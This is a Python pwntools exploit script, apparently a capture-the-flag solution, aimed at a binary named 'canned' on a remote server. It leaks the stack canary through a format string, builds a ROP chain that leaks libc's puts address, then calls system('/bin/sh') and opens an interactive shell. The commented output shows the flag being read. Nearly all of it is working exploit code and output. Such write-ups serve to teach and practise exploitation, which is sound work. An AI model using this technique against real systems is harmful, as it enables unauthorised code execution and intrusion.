from pwn import * 

context.log_level = 'CRITICAL'

# step 0 - define vars
canned = ELF('./canned')
rop    = ROP(canned)

p = remote('35.238.225.156', 1007)
pop_rdi      = rop.find_gadget(['pop rdi', 'ret'])[0]
align_stck   = rop.find_gadget(['ret'])[0]
get_canary   = '%15$p'  # 15th element on the stack is the stack cookie
buffer_size  = 0x20 - 8 # minus 8 due to the stack cookie
main         = p64(canned.symbols['main'])


# step 1 - get canary & return back to main
p.recvuntil('Say something please')
p.sendline(get_canary)
p.recvline() # newline
leak = p.recvline()[:-1]
canary = p64(int(leak.decode() , 16))
print('canary leak: ', leak.decode())

p.recvuntil('try something else maybe')

# step 2 - leak libc addr, calculate base & return again to main
rop_payload  = b'A'*buffer_size 
rop_payload += canary
rop_payload += b'B'*8
rop_payload += p64(pop_rdi)
rop_payload += p64(canned.got['puts'])
rop_payload += p64(canned.plt['puts'])
rop_payload += main


p.sendline(rop_payload) # executing step 1 + 2
p.recvuntil('bye\n')
leak = p.recvline()[::-1][1:].hex()
puts_leak = int('0x' + leak, 16)
print('puts leak: ', hex(puts_leak)) # find version using libc database tools (https://libc.rip/)

libc = ELF('./libc6_2.27-3ubuntu1.3_amd64.so')
libc_base   = puts_leak - libc.symbols['puts']
libc_system = libc_base + libc.symbols['system']
str_bin_sh  = libc_base + 0x1b3e1a

print(
    'libc base ', hex(libc_base),
    '\nlibc syst ', hex(libc_system),
    '\nlibc binsh', hex(str_bin_sh),
)

# step 3 - back again at main: trigger overflow & jump to system
p.recvuntil('Say something please')
p.sendline('shaq-attack :D')
p.recvuntil('try something else maybe')

system_pwn  = b'A'*buffer_size 
system_pwn += canary
system_pwn += b'B'*8
system_pwn += p64(align_stck) # extra ROP sauce. Adding another ret gadget to keep the stack aligned or else libc will crash 
system_pwn += p64(pop_rdi)
system_pwn += p64(str_bin_sh)
system_pwn += p64(libc_system)

p.sendline(system_pwn) 
p.interactive()


# # # output:
# $ python3 solve.py
# canary leak:  0x76d758d0f3f17f00
# puts leak:  0x7f024d3efaa0
# libc base  0x7f024d36f000
# libc syst  0x7f024d3be550
# libc binsh 0x7f024d522e1a

# I think you are done now, good bye
# $ ls
# bin
# canned
# dev
# flag
# lib
# lib32
# lib64
# $ cat flag
# b00t2root{d0_U_h4V3_a_C4N_0pen3R?}